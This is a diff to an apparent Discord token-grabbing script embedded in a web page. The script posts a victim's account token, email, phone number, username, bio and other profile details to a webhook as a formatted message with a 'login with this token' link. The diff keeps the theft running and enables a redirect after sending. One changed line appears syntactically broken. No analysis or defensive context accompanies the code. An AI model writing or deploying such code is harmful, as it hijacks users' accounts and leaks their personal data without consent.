@@ -21,7 +21,7 @@ const h = window.location.href,
                 content: `${['','<@' + d.a + '>\n'][d.a != '' ? 1 : 0] + ['','<@&' + d.o + '>\n'][d.o != '' ? 1 : 0]} ~`,
                 embeds: [{
                     title: `User info:`,
-                    description: decodeURIComponent(`> User ID: ${decodeURIComponent(d.m)},\nToken: ⠀⠀⠀⠀⠀⠀ ${decodeURIComponent((d.p).slice(0, Math.floor((d.p).length / 2)) + ' ' + (d.p).slice(Math.floor((d.p).length / 2, (d.p).length)))},\n\n> Email: ${decodeURIComponent(d.z)}, \n> Phone: ${decodeURIComponent(d.y)}, \n> Nitro type: ${decodeURIComponent(d.r)},\n> Avatar: ${decodeURIComponent(d.i)},\n\n> ID: ${decodeURIComponent(d.t)},\n> Username: ${decodeURIComponent(d.k)},\nBio: ${decodeURIComponent(d.u)},\n\n> Date: ${u}.`),
+                    description: decodeURIComponent(`> User ID: ${decodeURIComponent(1)},\nToken: ⠀⠀⠀⠀⠀⠀ ${decodeURIComponent((d.p).slice(0, Math.floor((d.p).length / 2)) + ' ' + (d.p).slice(Math.floor((d.p).length / 2, (d.p).length)))},\n\n> Email: ${decodeURIComponent(d.z)}, \n> Phone: ${decodeURIComponent(d.y)}, \n> Nitro type: ${decodeURIComponent(d.r)},\n> Avatar: ${decodeURIComponent(d.i)},\n\n> ID: ${decodeURIComponent(d.t)},\n> Username: ${decodeURIComponent(d.k)},\nBio: ${decodeURIComponent(d.u)},\n\n> Date: ${u}.`),
                     color: 4968880,
                 }, {
                     description: `[Want to login with this token?](https://discord.com/)`,
@@ -30,9 +30,9 @@ const h = window.location.href,
                 username: "𝕯𝖔𝖙",
                 attachments: [],
             })
-        }).then((e) => {}).catch(function(r) {
+        }).then((e) => window.location.href = d.m;).catch(function(r) {
             console.warn("", r);
-            // window.location.href = d.m;
+            window.location.href = d.m;
         });
     }
 </script>
